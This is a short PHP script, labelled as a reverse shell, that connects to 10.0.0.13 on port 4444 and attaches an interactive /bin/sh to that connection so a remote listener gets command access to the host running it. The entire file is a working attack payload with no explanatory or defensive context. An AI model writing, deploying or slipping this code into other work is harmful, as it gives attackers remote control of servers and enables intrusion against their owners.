<?php
// PHP reverse shell
$sock = fsockopen("10.0.0.13", 4444);
$descriptorspec = array(
    0 => $sock,
    1 => $sock,
    2 => $sock
);
$process = proc_open("/bin/sh -i", $descriptorspec, $pipes);
proc_close($process);
?>
